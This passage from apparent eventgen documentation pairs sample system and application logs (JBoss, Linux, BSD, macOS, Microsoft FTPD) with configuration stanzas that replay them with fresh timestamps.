Sample file name: **su_ubuntu.sample**

Example eventgen.conf:
```
[su_ubuntu.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/su_ubuntu_sample.log
## Replace timestamp Nov 17 21:41:22
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

## JBOSS Logs
#### Jbosslog4j logs (Samsung)
```
2005-03-07 01:57:43,964 [DiscoverEventPoller]  ERROR observer.ProcessFlowManagerConnector - Not connected with processflowmanager
2005-03-07 02:00:16,582 [task]  FATAL configuration.ConfigurableFactory - com.collation.platform.configuration.ConfigurationException: Invalid configuration, executable does not exist: /usr/local/collation/dist/bin/logforwarded.sh
2005-03-07 02:05:42,459 [RMI TCP Connection(9)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:42,559 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:42,610 [RMI TCP Connection(41)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:42,638 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:42,718 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:43,449 [RMI TCP Connection(9)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:43,467 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:43,493 [RMI TCP Connection(41)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:43,528 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:43,545 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:43,993 [RMI TCP Connection(9)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:44,011 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:44,029 [RMI TCP Connection(41)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:44,046 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:44,067 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:44,784 [RMI TCP Connection(9)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:44,832 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:44,907 [RMI TCP Connection(41)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:44,924 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:45,036 [RMI TCP Connection(21)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
2005-03-07 02:05:46,212 [RMI TCP Connection(9)-10.10.50.4]  ERROR configuration.ConfigurationDirectory - Could not retrieve old object value
```

Sample file name: **jboss.log4j.sample**

Example eventgen.conf:
```
[jboss.log4j.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/jboss.log4j.log


token.0.token = \d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2},\d{3,6}
token.0.replacementType = timestamp
token.0.replacement = %Y-%m-%d %H:%M:%S,000
```

## Linux Logs
#### I. Cron/crontab logs
```
May 28 13:04:20 Lab7 crond[2843]: /usr/sbin/crond 4.4 dillon's cron daemon, started with loglevel notice
May 28 13:04:20 Lab7 crond[2843]: no timestamp found (user root job sys-hourly)
May 28 13:04:20 Lab7 crond[2843]: no timestamp found (user root job sys-daily)
May 28 13:04:20 Lab7 crond[2843]: no timestamp found (user root job sys-weekly)
May 28 13:04:20 Lab7 crond[2843]: no timestamp found (user root job sys-monthly)
Jun 13 07:46:22 Lab7 crond[3592]: unable to exec /usr/sbin/sendmail: cron output for user root job sys-daily to /dev/null
Sep 11 09:46:33 sys1 crontab[20601]: (root) BEGIN EDIT (root)
Sep 11 09:46:39 sys1 crontab[20601]: (root) REPLACE (root)
Sep 11 09:46:39 sys1 crontab[20601]: (root) END EDIT (root)
Sep 11 09:50:42 sys1 crontab[20230]: (root) BEGIN EDIT (user1)
Sep 11 09:51:06 sys1 crontab[20230]: (root) REPLACE (user1)
Sep 11 09:51:06 sys1 crontab[20230]: (root) END EDIT (user1)
Sep 11 09:51:39 sys1 crontab[20761]: (user1) BEGIN EDIT (user1)
Sep 11 09:51:46 sys1 crontab[20761]: (user1) REPLACE (user1)
Sep 11 09:51:46 sys1 crontab[20761]: (user1) END EDIT (user1)
Sep 11 15:20:57 copacabana crontab[7972]: (dcid) BEGIN EDIT (dcid)
Sep 11 15:21:26 copacabana crontab[7972]: (dcid) REPLACE (dcid)
Sep 11 15:21:26 copacabana crontab[7972]: (dcid) END EDIT (dcid)
Sep 11 15:22:01 copacabana /USR/SBIN/CRON[7993]: (dcid) CMD (/bin/xx)
Sep 11 15:22:01 copacabana /USR/SBIN/CRON[7992]: (dcid) MAIL (mailed 102 bytes of output but got status 0x0001 )
```

Sample file name: **cron_crontab.sample**

Example eventgen.conf:
```
[cron_crontab.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/cron_crontab_sample.log
## Replace timestamp Nov 17 21:41:22
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

#### II. Linux kernel logs
```
Feb 20 21:20:06 server1 kernel: SLUB: Unable to allocate memory on node -1 (gfp=0x20)
Feb 20 21:20:06 server1 kernel:  cache: kmalloc-4096, object size: 4096, buffer size: 4096, default order: 3, min order: 0
Feb 20 21:20:06 server1 kernel:  node 0: slabs: 619, objs: 1641, free: 0
Feb 20 21:20:06 server1 kernel: swapper: page allocation failure. order:0, mode:0x4020
Feb 20 21:20:06 server1 kernel: Pid: 0, comm: swapper Not tainted 2.6.32.4 #1
Feb 20 21:20:06 server1 kernel: Call Trace:
Feb 20 21:20:06 server1 kernel: <IRQ>  [<ffffffff81084d3a>] ? __alloc_pages_nodemask+0x54a/0x670
Feb 20 21:20:06 server1 kernel: [<ffffffff810b1f8a>] ? __slab_alloc+0x69a/0x6b0
Feb 20 21:20:06 server1 kernel: [<ffffffff81710ee7>] ? __netdev_alloc_skb+0x17/0x40
Feb 20 21:20:06 server1 kernel: [<ffffffff8178309d>] ? tcp_v4_rcv+0x6bd/0x780
Feb 20 21:20:06 server1 kernel: [<ffffffff81710ee7>] ? __netdev_alloc_skb+0x17/0x40
Feb 20 21:20:06 server1 kernel: [<ffffffff810b2f0b>] ? __kmalloc_track_caller+0xcb/0x110
Feb 20 21:20:06 server1 kernel: [<ffffffff81710b6b>] ? __alloc_skb+0x6b/0x170
Feb 20 21:20:06 server1 kernel: [<ffffffff81710ee7>] ? __netdev_alloc_skb+0x17/0x40
Feb 20 21:20:06 server1 kernel: [<ffffffff8164fa29>] ? rtl8169_rx_fill+0xc9/0x220
Feb 20 21:20:06 server1 kernel: [<ffffffff8164fdc0>] ? rtl8169_rx_interrupt+0x240/0x520
Feb 20 21:20:06 server1 kernel: [<ffffffff81650236>] ? rtl8169_poll+0x56/0x240
Feb 20 21:20:06 server1 kernel: [<ffffffff8171d513>] ? net_rx_action+0x83/0x130
Feb 20 21:20:06 server1 kernel: [<ffffffff81049dd6>] ? __do_softirq+0xa6/0x130
Feb 20 21:20:06 server1 kernel: [<ffffffff8100c5ec>] ? call_softirq+0x1c/0x30
Feb 20 21:20:06 server1 kernel: [<ffffffff8100e58d>] ? do_softirq+0x4d/0x80
Feb 20 21:20:06 server1 kernel: [<ffffffff81049c15>] ? irq_exit+0x95/0xa0
Feb 20 21:20:06 server1 kernel: [<ffffffff8100db8e>] ? do_IRQ+0x6e/0xe0
Feb 20 21:20:06 server1 kernel: [<ffffffff8100be53>] ? ret_from_intr+0x0/0xa
Feb 20 21:20:06 server1 kernel: <EOI>  [<ffffffff8101f020>] ? lapic_next_event+0x0/0x20
Feb 20 21:20:06 server1 kernel: [<ffffffff81013452>] ? default_idle+0x32/0x40
Feb 20 21:20:06 server1 kernel: [<ffffffff81013494>] ? c1e_idle+0x34/0x100
Feb 20 21:20:06 server1 kernel: [<ffffffff8100a14c>] ? cpu_idle+0xac/0x100
Feb 28 07:46:15 bs11 kernel: svc: unknown program 100227 (me 100003)
May 21 20:22:28 slacker2 kernel: tcp_parse_options: Illegal window scaling value 200 >14 received.
Jun  1 22:20:05 secserv kernel: Kernel logging (proc) stopped.
Jun  1 22:20:05 secserv kernel: Kernel log daemon terminating.
Jun  1 22:20:06 secserv exiting on signal 15
Jun  7 15:32:50 Lab4 kernel: cdrom: This disc doesn't have any tracks I recognize!
Jun  7 15:32:50 Lab4 kernel: sr 3:0:0:0: [sr0] Result: hostbyte=DID_OK driverbyte=DRIVER_SENSE
Jun  7 15:32:50 Lab4 kernel: sr 3:0:0:0: [sr0] Sense Key : Illegal Request [current]
Jun  7 15:32:50 Lab4 kernel: Info fld=0x0
Jun  7 15:32:50 Lab4 kernel: sr 3:0:0:0: [sr0] Add. Sense: Logical block address out of range
Jun  7 15:32:50 Lab4 kernel: sr 3:0:0:0: [sr0] CDB: Read(10): 28 00 00 00 00 00 00 00 01 00
Jun  7 15:32:50 Lab4 kernel: end_request: I/O error, dev sr0, sector 0
Jun  7 15:32:50 Lab4 kernel: Buffer I/O error on device sr0, logical block 0
Jun 20 09:44:14 srv1 kernel: chttp[5849] general protection ip:7f185c076c93 sp:7fff38b79610 error:0 in libc-2.12.so[7f185c009000+153000]
Jun 20 09:56:31 srv1 kernel: chttp[5883]: segfault at 0 ip 00007f0cc4898af0 sp 00007fff0b43d5f8 error 4 in libc-2.12.so[7f0cc481f000+153000]
Jun 27 16:42:52 Lab14 kernel: usb 3-1.2: new full speed USB device using uhci_hcd and address 6
Jun 27 16:42:52 Lab14 kernel: usb 3-1.2: not running at top speed; connect to a high speed hub
Jun 27 16:42:52 Lab14 kernel: scsi5 : usb-storage 3-1.2:1.0
Jun 27 16:42:53 Lab14 kernel: scsi 5:0:0:0: Direct-Access     Ut165    USB2FlashStorage 0.00 PQ: 0 ANSI: 2
Jun 27 16:42:53 Lab14 kernel: sd 5:0:0:0: Attached scsi generic sg2 type 0
Jun 27 16:42:53 Lab14 kernel: sd 5:0:0:0: [sdb] 15794176 512-byte logical blocks: (8.08 GB/7.53 GiB)
Jun 27 16:42:53 Lab14 kernel: sd 5:0:0:0: [sdb] Write Protect is off
Jun 27 16:42:53 Lab14 kernel: sdb: unknown partition table
Jun 27 16:42:53 Lab14 kernel: sd 5:0:0:0: [sdb] Attached SCSI removable disk
Jun 27 16:43:01 Lab14 kernel: EXT3-fs: barriers not enabled
Jun 27 16:43:01 Lab14 kernel: kjournald starting.  Commit interval 5 seconds
Jun 27 16:43:01 Lab14 kernel: EXT3-fs (sdb): warning: maximal mount count reached, running e2fsck is recommended
Jun 27 16:43:01 Lab14 kernel: EXT3-fs (sdb): using internal journal
Jun 27 16:43:01 Lab14 kernel: EXT3-fs (sdb): mounted filesystem with writeback data mode
```

Sample file name: **linux_kernel.sample**

Example eventgen.conf:
```
[linux_kernel.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/linux_kernel_sample.log
## Replace timestamp Nov 17 21:41:22
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

#### III. Linux pacman logs
```
[2010-05-28 14:41] installed filesystem (2010.02-4)
[2010-05-28 14:41] installed util-linux-ng (2.17.2-2)
[2010-05-28 14:41] installed e2fsprogs (1.41.11-1)
[2010-05-28 14:41] installed cryptsetup (1.1.0-2)
[2010-05-28 14:41] installed dash (0.5.5.1-2)
[2010-05-28 14:41] installed dcron (4.4-2)
[2010-05-28 14:41] installed dhcpcd (5.2.2-1)
[2010-05-28 14:41] installed diffutils (3.0-1)
[2010-05-28 14:41] installed file (5.04-2)
[2010-05-28 14:41] installed findutils (4.4.2-2)
[2010-05-28 14:41] installed gawk (3.1.8-1)
[2010-05-28 14:41] installed gen-init-cpio (2.6.32-1)
[2010-05-28 14:41] installed gettext (0.17-4)
[2010-05-28 14:41] installed pcre (8.02-1)
[2010-05-28 14:41] installed grep (2.6.3-1)
[2010-05-28 14:41] installed sed (4.2.1-2)
[2010-05-28 14:41] installed grub (0.97-17)
[2010-05-28 14:41] installed gzip (1.4-1)
[2010-05-28 14:41] installed libusb (0.1.12-4)
[2010-05-28 14:41] installed glib2 (2.24.1-1)
[2010-05-28 14:41] installed module-init-tools (3.11.1-2)
[2010-05-28 14:41] installed udev (151-3)
[2010-05-28 14:41] installed net-tools (1.60-14)
[2010-05-28 14:41] installed kbd (1.15.2-1)
[2010-05-28 14:41] installed sysvinit (2.86-5)
[2010-05-28 14:41] installed initscripts (2010.05-3)
[2010-05-28 14:41] installed iputils (20100214-2)
[2010-05-28 14:41] installed jfsutils (1.1.14-1)
[2010-05-28 14:41] installed kernel26-firmware (2.6.33.4-1)
[2010-05-28 14:41] installed mkinitcpio-busybox (1.16.1-3)
[2010-05-28 14:41] installed which (2.20-3)
[2010-05-28 14:41] installed mkinitcpio (0.6.4-1)
[2010-05-28 12:41] >>> Updating module dependencies. Please wait ...
[2010-05-28 12:41] >>> MKINITCPIO SETUP
[2010-05-28 12:41] >>> ----------------
[2010-05-28 12:41] >>> If you use LVM2, Encrypted root or software RAID,
[2010-05-28 12:41] >>> Ensure you enable support in /etc/mkinitcpio.conf .
[2010-05-28 12:41] >>> More information about mkinitcpio setup can be found here:
[2010-05-28 12:41] >>> http://wiki.archlinux.org/index.php/Mkinitcpio
```

Sample file name: **linux_pacman.sample**

Example eventgen.conf:
```
[linux_pacman.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/linux_pacman_sample.log
## Replace timestamp 2010-05-28 16:10
token.0.token = \d{4}-\d{1,2}-\d{1,2} \d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %Y-%m-%d %H:%M
```

#### IV. Linux S.M.A.R.T logs
```
Jun 16 18:34:31 Lab8 smartd[2842]: Device: /dev/sda [SAT], SMART Usage Attribute: 194 Temperature_Celsius changed from 106 to 105
Jun 16 18:54:31 Lab8 -- MARK --
Jun 16 19:04:31 Lab8 smartd[2842]: Device: /dev/sda [SAT], SMART Prefailure Attribute: 7 Seek_Error_Rate changed from 200 to 100
Jun 16 12:32:40 Lab9 smartd[2881]: Configuration file /etc/smartd.conf was parsed, found DEVICESCAN, scanning devices
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda, type changed from 'scsi' to 'sat'
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda [SAT], opened
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda [SAT], found in smartd database.
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda [SAT], is SMART capable. Adding to "monitor" list.
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda [SAT], state read from /var/lib/smartmontools/smartd.ST3500620AS-5QM2644Q.ata.state
Jun 16 12:32:40 Lab9 smartd[2881]: Monitoring 1 ATA and 0 SCSI devices
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda [SAT], 1 Currently unreadable (pending) sectors
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda [SAT], 1 Offline uncorrectable sectors
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda [SAT], SMART Prefailure Attribute: 1 Raw_Read_Error_Rate changed from 106 to 111
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda [SAT], SMART Usage Attribute: 190 Airflow_Temperature_Cel changed from 72 to 69
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda [SAT], SMART Usage Attribute: 194 Temperature_Celsius changed from 28 to 31
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda [SAT], SMART Usage Attribute: 195 Hardware_ECC_Recovered changed from 45 to 42
Jun 16 12:32:40 Lab9 smartd[2881]: Device: /dev/sda [SAT], state written to /var/lib/smartmontools/smartd.ST3500620AS-5QM2644Q.ata.state
Jun 16 12:32:40 Lab9 smartd[2987]: smartd has fork()ed into background mode. New PID=2987.
```

Sample file name: **linux_smartd.sample**

Example eventgen.conf:
```
[linux_smartd.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/linux_smartd_sample.log
## Replace timestamp Jun 16 18:34:31
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

#### V. Linux XFS logs
```
Jun  8 13:39:55 www kernel:  <1>XFS internal error XFS_WANT_CORRUPTED_RETURN at line 295 of file fs/xfs/xfs_alloc.c.  Caller 0xf892df50
Jun  8 13:39:55 www kernel: XFS internal error XFS_WANT_CORRUPTED_RETURN at line 295 of file fs/xfs/xfs_alloc.c.  Caller 0xf892df50
Jun  8 13:39:55 www kernel: XFS internal error XFS_WANT_CORRUPTED_RETURN at line 295 of file fs/xfs/xfs_alloc.c.  Caller 0xf892df50
Jun  8 13:39:55 www kernel: XFS internal error XFS_WANT_CORRUPTED_RETURN at line 295 of file fs/xfs/xfs_alloc.c.  Caller 0xf892df50
Jun  8 13:39:55 www kernel: XFS internal error XFS_WANT_CORRUPTED_RETURN at line 295 of file fs/xfs/xfs_alloc.c.  Caller 0xf892df50
Jun  9 14:04:32 www kernel:  <1>XFS internal error XFS_WANT_CORRUPTED_RETURN at line 295 of file fs/xfs/xfs_alloc.c.  Caller 0xf892df50
Jun  9 14:04:32 www kernel: XFS internal error XFS_WANT_CORRUPTED_RETURN at line 295 of file fs/xfs/xfs_alloc.c.  Caller 0xf892df50
```

Sample file name: **linux_xfs.sample**

Example eventgen.conf:
```
[linux_xfs.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/linux_xfs_sample.log
## Replace timestamp Jun  8 13:39:55
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

#### VI. Linux YUM logs
```
Dec  7 07:05:06 ax yum: Installed: libX11-devel - 1.0.3-9.el5.i386
Dec  7 07:05:06 ax yum: Installed: libXext-devel - 1.0.1-2.1.i386
Dec  7 07:05:07 ax yum: Installed: libICE-devel - 1.0.1-2.1.i386
Dec  7 14:03:48 axz yum-updatesd-helper: error getting update info: Cannot retrieve repository metadata (repomd.xml) for repository: rhel-x86_64-server-vt-5. Please verify its path and try again
Dec 18 01:50:16 xyz yum: Updated: nspr - 4.7.3-2.el5.x86_64
Dec 18 01:50:16 xyz yum: Updated: nss - 3.12.2.0-2.el5.x86_64
Aug 20 12:45:56 Updated: perl.i386 4:5.8.8-10.el5_2.3
Aug 20 12:46:57 Installed: device-mapper-event.i386 1.02.24-1.el5
Aug 20 12:51:21 Erased: libhugetlbfs-lib
```

Sample file name: **linux_yum.sample**

Example eventgen.conf:
```
[linux_yum.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/linux_yum_sample.log
## Replace timestamp Jun  8 13:39:55
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

## BSD Logs
#### I. OpenBSD logs
```
Dec 30 21:01:13 bsd1 /bsd: uid 0 on /: file system full
Dec 30 21:07:01 bsd1 /bsd: uid 0 on /tmp: file system full
Dec 30 21:09:25 bsd1 pflogd[1234]: Logging suspended: fwrite: No space left
```

Sample file name: **openbsd.sample**

Example eventgen.conf:
```
[openbsd.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/openbsd.log
## Replace timestamp Dec 30 21:01:13
token.0.token = \w{3}\s+\d{2}\s+\d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %I:%M:%S
```

#### II. FreeBSD logs
```
Jan 9 14:00:28 t123 login: pam_ldap: error trying to bind as user "uid=xx,ou=Users,dc=yy,dc=zz,dc=com" (Invalid credentials)
Jan 9 14:00:37 t123 login: pam_ldap: error trying to bind as user "uid=xx,ou=Users,dc=yy,dc=zz,dc=com" (Invalid credentials)
Jan 9 14:00:41 t123 login: 2 LOGIN FAILURES FROM xx.yy.net.pl
```
Sample file name: **freebsd.sample**

Example eventgen.conf:
```
[freebsd.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/freebsd.log
## Replace timestamp Jan 9 14:00:28
token.0.token = \w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %I:%M:%S
```

#### III. FreeBSD NTP sync logs
```
Jan 9 18:00:11 t123 ntpdate[92110]: adjust time server 1.2.3.4 offset 0.053179 sec
Jan 9 19:00:04 t123 ntpdate[92238]: adjust time server 1.2.3.4 offset 0.095983 sec
Jan 9 20:00:04 t123 ntpdate[92364]: adjust time server 1.2.3.4 offset 0.048435 sec
```
Sample file name: **freebsd_ntp.sample**

Example eventgen.conf:
```
[freebsd_ntp.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/freebsd_ntp.log
## Replace timestamp Jan 9 18:00:11
token.0.token = \w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %I:%M:%S
```

## Asl Logs
```
[Time 2006.12.28 01:59:49 UTC] [Facility install] [Sender Software Update] [PID 353] [Message JavaScript error "Undefined value" while running "__choice_su_visible"] [Level 3] [UID -2] [GID -2] [Host Hostname]
[Time 2006.12.28 01:59:49 UTC] [Facility install] [Sender Software Update] [PID 353] [Message __choice_su_visible returned error: Undefined value] [Level 3] [UID -2] [GID -2] [Host Hostname]
[Time 2006.12.28 01:59:52 UTC] [Facility install] [Sender Software Update] [PID 353] [Message Package Authoring Error: installation-check results requires a message] [Level 3] [UID -2] [GID -2] [Host Hostname]
[Time 2006.12.28 01:59:52 UTC] [Facility install] [Sender Software Update] [PID 353] [Message Package Authoring Error: installation-check results requires a message] [Level 3] [UID -2] [GID -2] [Host Hostname]
[Time 2006.12.28 01:59:52 UTC] [Facility install] [Sender Software Update] [PID 353] [Message Package Authoring Error: installation-check results requires a message] [Level 3] [UID -2] [GID -2] [Host Hostname]
[Time 2006.12.28 01:59:55 UTC] [Facility install] [Sender Software Update] [PID 353] [Message JavaScript error "Undefined value" while running "__choice_su_visible"] [Level 3] [UID -2] [GID -2] [Host Hostname]
[Time 2006.12.28 01:59:55 UTC] [Facility install] [Sender Software Update] [PID 353] [Message __choice_su_visible returned error: Undefined value] [Level 3] [UID -2] [GID -2] [Host Hostname]
```
Sample file name: **asl.sample**

Example eventgen.conf:
```
[asl.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/asl_sample.log
## Replace timestamp 2006.12.28 01:59:52
token.0.token = \d{4}\.\d{1,2}\.\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %Y.%m.%d %H:%M:%S
```

## OSX IPFW Logs
```
Aug 21 21:37:18 Macinfish ipfw:  12190 Deny TCP 83.227.141.74:4835 192.168.11.111:6881 in via en1
Aug 21 21:37:27 Macinfish ipfw:  12190 Deny TCP 83.227.141.74:4835 192.168.11.111:6881 in via en1
Aug 25 10:32:19 Macinfish ipfw:  12190 Deny TCP 192.168.11.123:64748 10.10.10.13:4444 in via en0
Aug 27 14:32:58 Macinfish ipfw:  12190 Deny TCP 192.168.13.1:2060 192.168.13.104:5000 in via en1
Aug 27 14:33:01 Macinfish ipfw:  12190 Deny TCP 192.168.13.1:2060 192.168.13.104:5000 in via en1
Aug 27 14:33:07 Macinfish ipfw:  12190 Deny TCP 192.168.13.1:2060 192.168.13.104:5000 in via en1
Aug 27 14:33:19 Macinfish ipfw:  12190 Deny TCP 192.168.13.1:2060 192.168.13.104:5000 in via en1
Aug 27 14:33:43 Macinfish ipfw:  12190 Deny TCP 192.168.13.1:2060 192.168.13.104:5000 in via en1
Aug 29 10:36:44 Macinfish ipfw:  12190 Deny TCP 192.168.10.2:10000 192.168.11.122:23 in via en0
Aug 29 10:36:44 Macinfish ipfw:  12190 Deny TCP 192.168.10.2:10000 192.168.11.122:80 in via en0
Aug 29 10:36:44 Macinfish ipfw:  12190 Deny TCP 192.168.10.2:10000 192.168.11.122:443 in via en0
Aug 29 10:36:44 Macinfish ipfw:  12190 Deny TCP 192.168.10.2:10000 192.168.11.122:137 in via en0
Aug 29 10:36:44 Macinfish ipfw:  12190 Deny TCP 192.168.10.2:10000 192.168.11.122:138 in via en0
Aug 29 10:36:44 Macinfish ipfw:  12190 Deny TCP 192.168.10.2:10000 192.168.11.122:139 in via en0
Aug 29 10:36:44 Macinfish ipfw:  12190 Deny TCP 192.168.10.2:10000 192.168.11.122:445 in via en0
Aug 29 10:36:44 Macinfish ipfw:  12190 Deny TCP 192.168.10.2:10000 192.168.11.122:20 in via en0
Aug 29 10:36:44 Macinfish ipfw:  12190 Deny TCP 192.168.10.2:10000 192.168.11.122:25 in via en0
```
Sample file name: **osx_ipfw.sample**

Example eventgen.conf:
```
[osx_ipfw.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/osx_ipfw_sample.log
## Replace timestamp Nov 17 21:41:22
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```


## Mac Log
```
Aug 11 17:22:14 hocha com.apple.SecurityServer: authinternal failed to authenticate user root.
Aug 11 17:22:14 hocha com.apple.SecurityServer: Failed to authorize right system.login.tty by process /usr/sbin/sshd for authorization created by /usr/sbin/sshd.
Aug 11 17:22:16 hocha com.apple.SecurityServer: authinternal failed to authenticate user root.
Aug 11 17:22:16 hocha com.apple.SecurityServer: Failed to authorize right system.login.tty by process /usr/sbin/sshd for authorization created by /usr/sbin/sshd.
Aug 11 17:22:17 hocha com.apple.SecurityServer: authinternal failed to authenticate user root.
Aug 11 17:22:17 hocha com.apple.SecurityServer: Failed to authorize right system.login.tty by process /usr/sbin/sshd for authorization created by /usr/sbin/sshd.
```
Sample file name: **maclog.sample**

Example eventgen.conf:
```
[maclog.sample]
interval = 60
earliest = -60s
latest = now
count = 10
randomizeEvents = true
outputMode = file
fileName = Temp/macosx_sample.log
## Replace timestamp Nov 17 21:41:22
token.0.token = \w{3}\s+\d{1,2} \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %b %d %H:%M:%S
```

## FTP Logs
#### I. Microsoft FTPD Sample 1 logs
```
14:03:19 192.168.2.187 [62]USER Administrator 331 0
14:03:19 192.168.2.187 [62]PASS - 530 1326
14:03:19 192.168.2.187 [62]USER Administrator 331 0
14:03:19 192.168.2.187 [62]PASS - 530 1326
14:03:19 192.168.2.187 [62]USER Administrator 331 0
14:03:20 192.168.2.187 [62]PASS - 530 1326
14:03:20 192.168.2.187 [62]USER Administrator 331 0
14:03:20 192.168.2.187 [62]PASS - 530 1326
14:03:20 192.168.2.187 [62]USER Administrator 331 0
14:03:20 192.168.2.187 [62]PASS - 530 1326
14:03:21 192.168.2.187 [62]USER Administrator 331 0
14:03:21 192.168.2.187 [62]PASS - 530 1326
14:37:52 10.1.2.35 [63]USER username 331 0
14:37:52 10.1.2.35 [63]PASS - 230 0
14:37:52 10.1.2.35 [63]CWD /dir 250 0
14:37:52 10.1.2.35 [63]CWD /dir/_mm 550 2
14:37:52 10.1.2.35 [63]CWD /dir/_notes 250 0
14:37:54 10.1.2.35 [63]CWD / 250 0
14:37:54 10.1.2.35 [63]MKD /dir/XYIZNWSK 257 0
14:37:54 10.1.2.35 [63]CWD /dir 250 0
14:37:54 10.1.2.35 [63]CWD / 250 0
14:37:54 10.1.2.35 [63]RMD /dir/XYIZNWSK 250 0
```

Sample file name: **microsoftftpd_1.sample**

Example eventgen.conf:
```
[microsoftftpd_1.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/microsoftftpd1_sample.log
## Replace timestamp 21:01:13
token.0.token = \d{2}:\d{2}:\d{2}
token.0.replacementType = timestamp
token.0.replacement = %I:%M:%S
```

#### II. Microsoft FTPD Sample 2 logs
```
12:48:44 x.x.180.116 [11]USER anonymous 331 0
12:48:44 x.x.180.116 [11]PASS IEUser@ 530 1326
12:48:44 x.x.180.116 [12]USER administrator 331 0
12:48:44 x.x.180.116 [12]PASS - 530 1326
```

Sample file name: **microsoftftpd_2.sample**

Example eventgen.conf:
```
[microsoftftpd_2.sample]
interval = 15
earliest = -15s
latest = now
count = 100
outputMode = file
fileName = Temp/microsoftftpd2_sample.log
